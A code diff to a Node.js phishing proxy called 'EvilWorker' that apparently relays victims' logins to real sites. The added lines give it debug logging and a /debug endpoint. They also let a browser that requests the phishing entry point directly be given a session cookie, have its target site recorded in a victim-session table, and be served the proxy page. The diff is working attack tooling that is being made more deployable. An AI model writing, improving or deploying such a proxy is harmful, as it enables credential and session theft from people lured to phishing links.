@@ -43,6 +43,9 @@ const VICTIM_SESSIONS = {}
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
+    
+    // Debug logging for Render
+    console.log(`[${new Date().toISOString()}] ${method} ${url} - Session: ${currentSession || 'none'}`);
 
     // Health check endpoint for Render
     if (url === "/" || url === "/health") {
@@ -52,6 +55,23 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             service: "EvilWorker", 
             timestamp: new Date().toISOString(),
             uptime: process.uptime()
+        }));
+        return;
+    }
+
+    // Debug endpoint to check request details
+    if (url === "/debug") {
+        clientResponse.writeHead(200, { "Content-Type": "application/json" });
+        clientResponse.end(JSON.stringify({ 
+            url: url,
+            method: method,
+            headers: headers,
+            currentSession: currentSession,
+            hasRequestBody: !!clientRequestBody,
+            PROXY_ENTRY_POINT: PROXY_ENTRY_POINT,
+            PHISHED_URL_PARAMETER: PHISHED_URL_PARAMETER,
+            startsWithEntryPoint: url.startsWith(PROXY_ENTRY_POINT),
+            includesParameter: url.includes(PHISHED_URL_PARAMETER)
         }));
         return;
     }
@@ -278,8 +298,31 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     }
 
     else {
-        clientResponse.writeHead(301, { Location: REDIRECT_URL });
-        clientResponse.end();
+        // Handle direct browser requests to phishing endpoint without request body
+        if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+            try {
+                const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
+                const { cookieName, cookieValue } = generateNewSession(phishedURL);
+                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+                
+                VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
+                VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
+                VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
+                VICTIM_SESSIONS[cookieName].port = phishedURL.port;
+                VICTIM_SESSIONS[cookieName].host = phishedURL.host;
+
+                clientResponse.writeHead(200, { "Content-Type": "text/html" });
+                fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+            }
+            catch (error) {
+                displayError("Phishing URL parsing failed", error, url);
+                clientResponse.writeHead(404, { "Content-Type": "text/html" });
+                fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+            }
+        } else {
+            clientResponse.writeHead(301, { Location: REDIRECT_URL });
+            clientResponse.end();
+        }
     }
 });
 proxyServer.listen(process.env.PORT ?? 3000);
